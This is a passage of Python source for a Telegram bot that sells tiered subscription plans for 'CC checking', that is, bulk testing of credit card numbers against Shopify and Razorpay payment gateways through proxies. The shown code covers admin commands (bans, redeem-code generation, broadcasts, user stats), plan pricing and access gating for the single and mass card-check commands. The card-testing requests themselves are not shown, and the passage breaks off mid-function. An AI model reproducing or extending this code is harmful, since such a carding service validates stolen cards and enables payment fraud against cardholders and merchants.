    for uid, data in users.items():
        try:
            exp = datetime.fromisoformat(data['expires_at'])
            status = "✅" if now < exp else "❌"
            if now < exp:
                active += 1
            plan_key = data.get('plan', '?')
            plan = PLANS.get(plan_key, {})
            emoji = plan.get('emoji', '💎')
            cc_used  = data.get('cc_used', 0)
            cc_limit = data.get('cc_limit', 0)
            exp_str  = exp.strftime("%d %b %Y")
            lines.append(f"{status} <code>{uid}</code>  {emoji} {plan_key}  {cc_used}/{cc_limit}  exp {exp_str}")
        except Exception:
            lines.append(f"⚠️ <code>{uid}</code>  (corrupt)")

    header = f"👥 <b>Users ({active} active / {len(users)} total)</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
    await event.reply(premium_emoji(header + "\n".join(lines)), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/listcodes(?:\s|$)'))
async def list_codes_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
        return

    codes = load_codes()
    if not codes:
        await event.reply(premium_emoji("📭 No codes generated yet."), parse_mode='html')
        return

    unused = [(c, d) for c, d in codes.items() if not d['used']]
    used   = [(c, d) for c, d in codes.items() if d['used']]

    lines = [f"🎟️ <b>Redeem Codes</b>  ({len(unused)} unused / {len(codes)} total)\n━━━━━━━━━━━━━━━━━━━━━━"]
    if unused:
        lines.append("\n<b>✅ Unused:</b>")
        for code, data in unused[-20:]:
            plan = PLANS.get(data['plan'], {})
            lines.append(f"  {plan.get('emoji','💎')} <code>{code}</code>  {data['plan']}")
    if used:
        lines.append(f"\n<b>❌ Used ({len(used)}):</b>")
        for code, data in used[-10:]:
            lines.append(f"  <code>{code}</code> → {data.get('used_by','?')}")

    await event.reply(premium_emoji("\n".join(lines)), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/stats(?:\s|$)'))
async def stats_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
        return

    users  = load_users_data()
    codes  = load_codes()
    sites  = load_sites()
    proxies = load_proxies()
    now    = datetime.now()
    active = 0
    for d in users.values():
        try:
            if now < datetime.fromisoformat(d.get('expires_at', '2000-01-01')):
                active += 1
        except Exception:
            pass
    unused_codes = sum(1 for d in codes.values() if not d['used'])

    stats_text = (
        f"📊 <b>Bot Statistics</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👑 Admins          » {len(ADMIN_ID)}\n"
        f"💎 Active users    » {active}\n"
        f"🎟️ Unused codes    » {unused_codes}\n"
        f"🌐 Sites           » {len(sites)}\n"
        f"🔌 Proxies         » {len(proxies)}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🤖 Bot Status      » Running ✅"
    )
    await event.reply(premium_emoji(stats_text), parse_mode='html')


# ─── ADMIN: /ban ─────────────────────────────────────────────────────────────

@bot.on(events.NewMessage(pattern=r'^/ban(?:\s|$)'))
async def ban_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Admin only."), parse_mode='html')
        return

    parts = event.message.text.split(None, 2)
    if len(parts) < 2 or not parts[1].strip().isdigit():
        await event.reply(premium_emoji(
            "𝗕𝗔𝗡 𝗨𝗦𝗘𝗥\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "📌  Syntax   →  <code>/ban USER_ID reason</code>\n"
            "📌  Example  →  <code>/ban 123456789 spamming</code>\n"
            "📌  No reason →  <code>/ban 123456789</code>"
        ), parse_mode='html')
        return

    target_id = int(parts[1].strip())
    reason    = parts[2].strip() if len(parts) > 2 else "No reason provided"

    if target_id in ADMIN_ID:
        await event.reply(premium_emoji("❌ Cannot ban an admin!"), parse_mode='html')
        return

    if is_user_banned(target_id):
        await event.reply(premium_emoji(
            f"𝗔𝗟𝗥𝗘𝗔𝗗𝗬 𝗕𝗔𝗡𝗡𝗘𝗗\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⚠️  User <code>{target_id}</code> is already banned."
        ), parse_mode='html')
        return


    # Cancel any active sessions for the banned user
    if target_id in user_active_check:
        active_info = user_active_check[target_id]
        sk = active_info.get('session_key')
        if sk and sk in active_sessions:
            del active_sessions[sk]
        del user_active_check[target_id]

    ban_user(target_id, reason)

    await event.reply(premium_emoji(
        f"𝗨𝗦𝗘𝗥 𝗕𝗔𝗡𝗡𝗘𝗗\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤  ID        →  <code>{target_id}</code>\n"
        f"📝  Reason    →  {reason}\n"
        f"🕐  Time      →  {datetime.now().strftime('%d %b %Y, %H:%M')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⚡  /unban {target_id} to reverse"
    ), parse_mode='html')

    # Notify the banned user
    try:
        await bot.send_message(target_id, premium_emoji(
            f"𝗬𝗢𝗨 𝗔𝗥𝗘 𝗕𝗔𝗡𝗡𝗘𝗗\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📝  Reason    →  {reason}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💡  Contact @AYANOOXD if this is a mistake"
        ), parse_mode='html')
    except Exception:
        pass


# ─── ADMIN: /unban ───────────────────────────────────────────────────────────

@bot.on(events.NewMessage(pattern=r'^/unban(?:\s|$)'))
async def unban_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Admin only."), parse_mode='html')
        return

    parts = event.message.text.split(None, 1)
    if len(parts) < 2 or not parts[1].strip().isdigit():
        await event.reply(premium_emoji(
            "𝗨𝗡𝗕𝗔𝗡 𝗨𝗦𝗘𝗥\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "📌  Syntax   →  <code>/unban USER_ID</code>\n"
            "📌  Example  →  <code>/unban 123456789</code>"
        ), parse_mode='html')
        return

    target_id = int(parts[1].strip())

    if unban_user(target_id):
        await event.reply(premium_emoji(
            f"𝗨𝗦𝗘𝗥 𝗨𝗡𝗕𝗔𝗡𝗡𝗘𝗗\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤  ID      →  <code>{target_id}</code>\n"
            f"🕐  Time    →  {datetime.now().strftime('%d %b %Y, %H:%M')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"✅  User can now use the bot again"
        ), parse_mode='html')
        # Notify the unbanned user
        try:
            await bot.send_message(target_id, premium_emoji(
                "𝗬𝗢𝗨 𝗔𝗥𝗘 𝗨𝗡𝗕𝗔𝗡𝗡𝗘𝗗\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "✅  Welcome back! You can use the bot again."
            ), parse_mode='html')
        except Exception:
            pass
    else:
        await event.reply(premium_emoji(
            f"𝗡𝗢𝗧 𝗕𝗔𝗡𝗡𝗘𝗗\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⚠️  User <code>{target_id}</code> is not in the ban list"
        ), parse_mode='html')


# ─── ADMIN: /removeplan ──────────────────────────────────────────────────────

@bot.on(events.NewMessage(pattern=r'^/removeplan(?:\s|$)'))
async def removeplan_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Admin only."), parse_mode='html')
        return

    parts = event.message.text.split(None, 1)
    if len(parts) < 2 or not parts[1].strip().isdigit():
        await event.reply(premium_emoji(
            "𝗥𝗘𝗠𝗢𝗩𝗘 𝗣𝗟𝗔𝗡\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "📌  Syntax   →  <code>/removeplan USER_ID</code>\n"
            "📌  Example  →  <code>/removeplan 123456789</code>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "⚠️  Resets user plan to FREE"
        ), parse_mode='html')
        return

    target_id = str(parts[1].strip())

    if int(target_id) in ADMIN_ID:
        await event.reply(premium_emoji(
            "𝗘𝗥𝗥𝗢𝗥\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "❌  Cannot remove an admin's plan!"
        ), parse_mode='html')
        return

    users = load_users_data()
    if target_id not in users:
        await event.reply(premium_emoji(
            f"𝗡𝗢𝗧 𝗙𝗢𝗨𝗡𝗗\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⚠️  User <code>{target_id}</code> not found in database"
        ), parse_mode='html')
        return

    old_plan = users[target_id].get('plan', 'FREE')
    # Reset to FREE plan
    free_plan = PLANS['FREE']
    users[target_id] = {
        'plan': 'FREE',
        'expires_at': (datetime.now() + timedelta(days=free_plan['days'])).isoformat(),
        'cc_used': 0,
        'cc_limit': free_plan['cc_limit'],
        'redeemed_at': datetime.now().isoformat(),
    }
    save_users_data(users)

    await event.reply(premium_emoji(
        f"𝗣𝗟𝗔𝗡 𝗥𝗘𝗠𝗢𝗩𝗘𝗗\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤  User     →  <code>{target_id}</code>\n"
        f"❌  Old Plan →  {old_plan}\n"
        f"✅  New Plan →  FREE 🆓\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⚡  User has been reset to FREE plan"
    ), parse_mode='html')

    try:
        await bot.send_message(int(target_id), premium_emoji(
            f"𝗣𝗟𝗔𝗡 𝗥𝗘𝗠𝗢𝗩𝗘𝗗\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"❌  Old Plan →  {old_plan}\n"
            f"✅  Now      →  FREE 🆓\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💡  Use /plan to purchase a new plan"
        ), parse_mode='html')
    except Exception:
        pass


# ─── ADMIN: /getcodes ────────────────────────────────────────────────────────

@bot.on(events.NewMessage(pattern=r'^/getcodes(?:\s|$)'))
async def getcodes_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Admin only."), parse_mode='html')
        return

    parts = event.message.text.split(None, 1)
    filter_plan = parts[1].strip().upper() if len(parts) > 1 else None

    codes = load_codes()
    unused = {c: d for c, d in codes.items() if not d['used']}

    if filter_plan:
        unused = {c: d for c, d in unused.items() if d.get('plan') == filter_plan}

    if not unused:
        plan_info = f" for {filter_plan}" if filter_plan else ""
        await event.reply(premium_emoji(
            f"𝗡𝗢 𝗖𝗢𝗗𝗘𝗦 𝗙𝗢𝗨𝗡𝗗\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📭  No unused codes found{plan_info}"
        ), parse_mode='html')
        return

    # Group by plan
    by_plan = {}
    for c, d in unused.items():
        p = d.get('plan', '?')
        by_plan.setdefault(p, []).append(c)

    lines = [f"𝗨𝗡𝗨𝗦𝗘𝗗 𝗖𝗢𝗗𝗘𝗦\n━━━━━━━━━━━━━━━━━━━━━━\n🎟️  Total  →  {len(unused)} codes\n━━━━━━━━━━━━━━━━━━━━━━"]
    for plan_key in ['FREE', 'BASIC', 'STANDARD', 'PREMIUM', 'VIP']:
        plan_codes = by_plan.get(plan_key, [])
        if not plan_codes:
            continue
        emoji = PLANS.get(plan_key, {}).get('emoji', '💎')
        lines.append(f"\n{emoji}  <b>{plan_key}</b>  ({len(plan_codes)})")
        for c in plan_codes:
            lines.append(f"    ▸  <code>{c}</code>")

    full_text = "\n".join(lines)

    # If too long, send as file
    if len(full_text) > 3800:
        import tempfile
        file_lines = []
        for plan_key, plan_codes in by_plan.items():
            for c in plan_codes:
                file_lines.append(f"{plan_key}: {c}")
        tmp = os.path.join(BASE_DIR, '_getcodes_tmp.txt')
        with open(tmp, 'w') as tf:
            tf.write("\n".join(file_lines))
        await bot.send_file(user_id, tmp,
            caption=premium_emoji(f"𝗨𝗡𝗨𝗦𝗘𝗗 𝗖𝗢𝗗𝗘𝗦\n━━━━━━━━━━━━━━━━━━━━━━\n🎟️  Total  →  {len(unused)} codes  (attached file)"),
            parse_mode='html')
        try:
            os.remove(tmp)
        except Exception:
            pass
    else:
        await event.reply(premium_emoji(full_text), parse_mode='html')


# ─── ADMIN: /banlist ─────────────────────────────────────────────────────────

@bot.on(events.NewMessage(pattern=r'^/banlist(?:\s|$)'))
async def banlist_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Admin only."), parse_mode='html')
        return

    banned = load_banned()
    if not banned:
        await event.reply(premium_emoji(
            "𝗕𝗔𝗡 𝗟𝗜𝗦𝗧\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "✅  No banned users"
        ), parse_mode='html')
        return

    lines = [f"𝗕𝗔𝗡𝗡𝗘𝗗 𝗨𝗦𝗘𝗥𝗦\n━━━━━━━━━━━━━━━━━━━━━━\n🚫  Total  →  {len(banned)} users\n━━━━━━━━━━━━━━━━━━━━━━"]
    for i, (uid, data) in enumerate(banned.items(), 1):
        reason     = data.get('reason', 'No reason')
        banned_at  = data.get('banned_at', '')
        try:
            dt_str = datetime.fromisoformat(banned_at).strftime('%d %b %Y')
        except Exception:
            dt_str = '?'
        lines.append(f"\n  {i}.  <code>{uid}</code>\n       📝  {reason}  ·  📅  {dt_str}")

    await event.reply(premium_emoji("\n".join(lines)), parse_mode='html')


# ─── ADMIN: /userinfo ────────────────────────────────────────────────────────

@bot.on(events.NewMessage(pattern=r'^/userinfo(?:\s|$)'))
async def userinfo_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Admin only."), parse_mode='html')
        return

    parts = event.message.text.split(None, 1)
    if len(parts) < 2 or not parts[1].strip().isdigit():
        await event.reply(premium_emoji(
            "🔍 <b>User Info</b>\n\n"
            "Usage: <code>/userinfo USER_ID</code>\n"
            "Example: <code>/userinfo 123456789</code>"
        ), parse_mode='html')
        return

    target_id = parts[1].strip()
    users     = load_users_data()
    banned    = load_banned()
    data      = users.get(target_id)

    is_banned = target_id in banned
    ban_info  = banned.get(target_id, {})

    if not data:
        status_line = "⚠️ Not in database (no plan)"
        plan_section = ""
    else:
        plan_key = data.get('plan', 'FREE')
        plan     = PLANS.get(plan_key, {})
        emoji    = plan.get('emoji', '💎')
        cc_used  = data.get('cc_used', 0)
        cc_limit = data.get('cc_limit', 0)
        try:
            exp = datetime.fromisoformat(data['expires_at'])
            now = datetime.now()
            exp_str   = exp.strftime('%d %b %Y, %H:%M')
            days_left = max(0, (exp - now).days)
            status_plan = "✅ Active" if now < exp else "❌ Expired"
        except Exception:
            exp_str = '?'
            days_left = 0
            status_plan = "❓ Unknown"

        plan_section = (
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{emoji} Plan       » <b>{plan_key}</b>  {status_plan}\n"
            f"⏳ Expires   » {exp_str}\n"
            f"📅 Days Left  » {days_left}\n"
            f"📊 CC Done   » {cc_used} (lifetime)\n"
            f"⚡ Per Session » {cc_limit} checks\n"
        )
        status_line = ""

    ban_section = ""
    if is_banned:
        ban_section = (
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🚫 <b>BANNED</b>\n"
            f"📝 Reason  » {ban_info.get('reason', '?')}\n"
            f"📅 Date    » {ban_info.get('banned_at', '?')[:10]}\n"
        )

    is_verified = is_user_verified(int(target_id))

    clean_status = f"\n{status_line}" if status_line else ""
    msg = (
        f"𝗨𝗦𝗘𝗥 𝗜𝗡𝗙𝗢\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤  ID        →  <code>{target_id}</code>\n"
        f"✅  Verified  →  {'Yes' if is_verified else 'No'}"
        f"{clean_status}\n"
        f"{plan_section}"
        f"{ban_section}"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    )
    await event.reply(premium_emoji(msg), parse_mode='html')


# ─── ADMIN: /broadcast ───────────────────────────────────────────────────────

@bot.on(events.NewMessage(pattern=r'^/broadcast(?:\s|$)'))
async def broadcast_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Admin only."), parse_mode='html')
        return

    parts = event.message.text.split(None, 1)
    if len(parts) < 2 or not parts[1].strip():
        await event.reply(premium_emoji(
            "𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "📌  Syntax  →  <code>/broadcast your message</code>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "📢  Sends message to ALL users in database"
        ), parse_mode='html')
        return

    message_text = parts[1].strip()
    users = load_users_data()

    sent = 0
    failed = 0
    status_msg = await event.reply(premium_emoji(
        f"𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧𝗜𝗡𝗚\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📢  Sending to {len(users)} users...\n"
        f"⏳  Please wait..."
    ), parse_mode='html')

    for uid in users:
        try:
            await bot.send_message(int(uid), premium_emoji(
                f"📢  𝗔𝗗𝗠𝗜𝗡 𝗡𝗢𝗧𝗜𝗖𝗘\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"{message_text}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"⚡  @AYANOOXD"
            ), parse_mode='html')
            sent += 1
            await asyncio.sleep(0.3)  # rate limit buffer (avoids FloodWait on broadcasts)
        except Exception:
            failed += 1

    try:
        await status_msg.edit(premium_emoji(
            f"𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 𝗗𝗢𝗡𝗘\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"✅  Sent    →  {sent}\n"
            f"❌  Failed  →  {failed}\n"
            f"👥  Total   →  {len(users)}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━"
        ), parse_mode='html')
    except Exception:
        pass


# ─── GENCODE INLINE CALLBACK ─────────────────────────────────────────────────

@bot.on(events.CallbackQuery(pattern=rb"gencode_(\w+)"))
async def gencode_callback(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.answer("❌ Admin only.", alert=True)
        return

    plan_key = event.pattern_match.group(1).decode().upper()
    if plan_key not in PLANS:
        await event.answer("❌ Invalid plan.", alert=True)
        return

    plan = PLANS[plan_key]
    prompt = (
        f"<b>Generate {plan_key} Code</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Plan   » <b>{plan_key}</b>\n"
        f"Days   » {plan['days']} day{'s' if plan['days'] > 1 else ''}\n"
        f"Limit  » {plan['cc_limit']} CC checks\n"
        f"Price  » {plan['price']}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"How many codes to generate?"
    )
    buttons = [
        [
            Button.inline("1",  f"gencount_{plan_key}_1".encode()),
            Button.inline("3",  f"gencount_{plan_key}_3".encode()),
            Button.inline("5",  f"gencount_{plan_key}_5".encode()),
        ],
        [
            Button.inline("10", f"gencount_{plan_key}_10".encode()),
            Button.inline("20", f"gencount_{plan_key}_20".encode()),
            Button.inline("50", f"gencount_{plan_key}_50".encode()),
        ],
        [Button.inline("Back", b"admin_panel", style="danger")],
    ]
    await event.edit(premium_emoji(prompt), buttons=buttons, parse_mode='html')


@bot.on(events.CallbackQuery(pattern=rb"gencount_(\w+)_(\d+)"))
async def gencount_callback(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.answer("❌ Admin only.", alert=True)
        return

    plan_key = event.pattern_match.group(1).decode().upper()
    count    = int(event.pattern_match.group(2).decode())

    if plan_key not in PLANS:
        await event.answer("❌ Invalid plan.", alert=True)
        return

    plan  = PLANS[plan_key]
    codes = [generate_code(plan_key) for _ in range(count)]

    if count == 1:
        code = codes[0]
        msg = (
            f"<b>Code Generated!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Plan   » <b>{plan_key}</b>\n"
            f"Code   » <code>{code}</code>\n"
            f"Days   » {plan['days']} day{'s' if plan['days'] > 1 else ''}\n"
            f"Limit  » {plan['cc_limit']} CC checks\n"
            f"Price  » {plan['price']}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Activate: <code>/redeem {code}</code>"
        )
    else:
        codes_text = "\n".join(f"  <code>{c}</code>" for c in codes)
        msg = (
            f"<b>{count} {plan_key} Codes Generated!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Plan   » <b>{plan_key}</b>\n"
            f"Days   » {plan['days']} day{'s' if plan['days'] > 1 else ''}\n"
            f"Limit  » {plan['cc_limit']} CC checks\n"
            f"Price  » {plan['price']}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b>Codes:</b>\n{codes_text}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Activate with: <code>/redeem CODE</code>"
        )

    await event.answer(f"✅ {count} {plan_key} code{'s' if count > 1 else ''} generated!")
    await bot.send_message(user_id, premium_emoji(msg), parse_mode='html')


# ─── /plan ───────────────────────────────────────────────────────────────────

@bot.on(events.NewMessage(pattern=r'^/plan(?:\s|$)'))
async def plan_command(event):
    plan_text = (
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💎 <b>CHECKER PLANS</b> 💎\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🆓 <b>FREE</b>\n"
        f"   💰 Price     » Free\n"
        f"   ⏳ Validity  » 30 Days\n"
        f"   📊 Limit     » 100 CC\n"
        f"   🏠 Access    » Group Only\n\n"
        f"🥉 <b>BASIC</b>\n"
        f"   💰 Price     » $1\n"
        f"   ⏳ Validity  » 1 Day\n"
        f"   📊 Limit     » 500 CC\n\n"
        f"🥈 <b>STANDARD</b>\n"
        f"   💰 Price     » $2\n"
        f"   ⏳ Validity  » 5 Days\n"
        f"   📊 Limit     » 1000 CC\n\n"
        f"🥇 <b>PREMIUM</b>\n"
        f"   💰 Price     » $7\n"
        f"   ⏳ Validity  » 15 Days\n"
        f"   📊 Limit     » 2000 CC\n\n"
        f"👑 <b>VIP</b>\n"
        f"   💰 Price     » $15\n"
        f"   ⏳ Validity  » 30 Days\n"
        f"   📊 Limit     » 5000 CC\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⚡ Fast · Stable · Premium\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💡 DM @AYANOOXD to purchase"
    )
    buttons = [
        [Button.url("CONTACT", "https://t.me/AYANOOXD", style="success"),
         Button.url("JOIN",   GROUP_LINK, style="success")],
    ]
    await event.reply(premium_emoji(plan_text), buttons=buttons, parse_mode='html')


# ─── /redeem ─────────────────────────────────────────────────────────────────

@bot.on(events.NewMessage(pattern=r'^/redeem(?:\s|$)'))
async def redeem_command(event):
    user_id = event.sender_id
    text = event.message.text.split(None, 1)

    if len(text) < 2 or not text[1].strip():
        await event.reply(premium_emoji(
            "🔑 <b>Redeem a Code</b>\n\n"
            "Usage: <code>/redeem YOUR-CODE-HERE</code>\n\n"
            "💡 Don't have a code? Use /plan to see our plans\n"
            "   and DM @AYANOOXD to purchase."
        ), parse_mode='html')
        return

    code = text[1].strip()
    status, info = redeem_code(user_id, code)

    if status == 'not_found':
        await event.reply(premium_emoji(
            "❌ <b>Invalid Code</b>\n\n"
            "This code doesn't exist. Check and try again.\n"
            "💡 Use /plan to purchase a valid code."
        ), parse_mode='html')
        return

    if status == 'already_active':
        await event.reply(premium_emoji(
            "🚫━━━━━━━━━━━━━━━━━━━━━━🚫\n"
            "   ACTIVE PLAN ALREADY EXISTS\n"
            "🚫━━━━━━━━━━━━━━━━━━━━━━🚫\n\n"
            "👤 You already have an active plan.\n\n"
            "⏳ You can redeem a <b>new code</b> only after your current plan <b>expires</b>.\n\n"
            "💡 Use /myplan to check your current plan status.\n"
            "━━━━━━━━━━━━━━━━━━━━━━"
        ), parse_mode='html')
        return

    if status == 'used':
        await event.reply(premium_emoji(
            "❌ <b>Code Already Used</b>\n\n"
            "This code has already been redeemed.\n"
            "💡 Use /plan to purchase a new code."
        ), parse_mode='html')
        return

    plan     = info['plan']
    plan_key = info['plan_key']
    exp      = info['expires_at']
    exp_str  = exp.strftime("%d %b %Y, %H:%M")

    success_msg = (
        f"🎉 <b>Code Redeemed!</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{plan['emoji']} Plan     » <b>{plan_key}</b>\n"
        f"⏳ Expires  » {exp_str}\n"
        f"📊 CC Limit » {plan['cc_limit']} checks\n"
        f"💰 Price    » {plan['price']}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"You're all set! Start checking:\n"
        f"  💳 <code>/cc card|mm|yy|cvv</code>\n"
        f"  📂 <code>/chk</code> — reply to .txt"
    )
    await event.reply(premium_emoji(success_msg), parse_mode='html')


# ─── /myplan ─────────────────────────────────────────────────────────────────

@bot.on(events.NewMessage(pattern=r'^/myplan(?:\s|$)'))
async def myplan_command(event):
    user_id = event.sender_id

    if user_id in ADMIN_ID:
        await event.reply(premium_emoji(
            "👑 <b>Your Plan: ADMIN</b>\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "⚡ You have full admin privileges\n"
            "✅ Unlimited CC checks\n"
            "✅ Access to all features\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "This is not a redeemable plan."
        ), parse_mode='html')
        return

    users = load_users_data()
    uid   = str(user_id)

    if uid not in users:
        await event.reply(premium_emoji(
            "❌ <b>No Active Plan</b>\n\n"
            "You don't have an active plan.\n"
            "💡 Use /plan to see available plans.\n"
            "💡 Use /redeem CODE to activate one."
        ), parse_mode='html')
        return

    data     = users[uid]
    plan_key = data.get('plan', '?')
    plan     = PLANS.get(plan_key, {})
    try:
        exp = datetime.fromisoformat(data['expires_at'])
        now = datetime.now()
        if now >= exp:
            await event.reply(premium_emoji(
                f"⏰ <b>Plan Expired</b>\n\n"
                f"{plan.get('emoji','💎')} {plan_key} plan expired on {exp.strftime('%d %b %Y')}\n\n"
                "💡 Use /plan to purchase a new plan."
            ), parse_mode='html')
            return
        days_left = (exp - now).days
        exp_str   = exp.strftime("%d %b %Y, %H:%M")
        cc_used   = data.get('cc_used', 0)
        cc_limit  = data.get('cc_limit', plan.get('cc_limit', 0))
        # Per-session: each new session resets to full cc_limit
        # cc_used = lifetime total checks done (does NOT reduce session limit)

        msg = (
            f"💎 <b>Your Active Plan</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{plan.get('emoji','💎')} Plan      » <b>{plan_key}</b>\n"
            f"⏳ Expires   » {exp_str}\n"
            f"📅 Days Left  » {days_left} day{'s' if days_left != 1 else ''}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 Total Done » {cc_used} checks (across all sessions)\n"
            f"⚡ Per Session » {cc_limit} checks per session\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💡 Har naye /chk ya /mrz session mein {cc_limit} CC check kar sakte ho!"
        )

        await event.reply(premium_emoji(msg), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error reading plan: {e}"), parse_mode='html')


# ─── RAZORPAY SINGLE CHECK ───────────────────────────────────────────────────

@bot.on(events.NewMessage(pattern=r'^/rz\s+'))
async def rz_command(event):
    user_id = event.sender_id

    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except Exception:
        username = f"user_{user_id}"

    # Razorpay gate: PREMIUM and VIP only
    if user_id not in ADMIN_ID:
        u_plan = load_users_data().get(str(user_id), {}).get('plan', 'FREE')
        if u_plan not in ('PREMIUM', 'VIP'):
            await event.reply(premium_emoji(
                "🥇 <b>PREMIUM / VIP Only</b>\n\n"
                "The Razorpay gate is restricted to\n"
                "<b>🥇 PREMIUM</b> and <b>👑 VIP</b> plan users.\n\n"
                "💡 Upgrade your plan: /plan"
            ), parse_mode='html')
            return

    check_status = can_check(user_id, event.is_private)
    if check_status == 'banned':
        await event.reply(premium_emoji(
            "𝗬𝗢𝗨 𝗔𝗥𝗘 𝗕𝗔𝗡𝗡𝗘𝗗\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "🚫  You have been banned from using this bot.\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "💡  Contact @AYANOOXD if this is a mistake"
        ), parse_mode='html')
        return
    if check_status == 'no_plan':
        await event.reply(premium_emoji(
            "❌ <b>No Plan Found</b>\n\nUse /plan to see plans\nUse /redeem CODE to activate"
        ), parse_mode='html')
        return
    if check_status == 'expired':
        await event.reply(premium_emoji("⏰ <b>Plan Expired</b>\n\nUse /plan to purchase."), parse_mode='html')
        return
    if check_status == 'group_only':
        await event.reply(premium_emoji(
            f"🆓 <b>Free Plan — Group Only</b>\n\nJoin group to check:\n{GROUP_LINK}"
        ), buttons=[[Button.url("🏠 Join Group", GROUP_LINK, style="success")]], parse_mode='html')
        return
    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available."), parse_mode='html')
        return

    cc_input = event.message.text.split(None, 1)[1].strip() if len(event.message.text.split(None, 1)) > 1 else ''
    cards = extract_cc(cc_input)
    if not cards:
        await event.reply(premium_emoji("❌ Invalid format. Use: <code>/rz card|mm|yy|cvv</code>"), parse_mode='html')
        return

    card = cards[0]

    # ─── ONE CHECK AT A TIME — block /rz if any check already running ──────
    if user_id in user_active_check:
        current_sess = user_active_check[user_id]
        _stype_map = {"chk": "🛒 Shopify Mass", "mrz": "💳 Razorpay Mass", "rz": "💳 Razorpay Single", "cc": "💳 Shopify Single"}
        session_type = _stype_map.get(current_sess['type'], "Active Check")
        await event.reply(premium_emoji(
            f"🚫 <b>Already Running!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"⚡ <b>Active Session:</b>  {session_type}\n\n"
            f"Wait for it to finish first."
        ), parse_mode='html')
        return
    # ─────────────────────────────────────────────────────────────────────────
    rz_loading = (
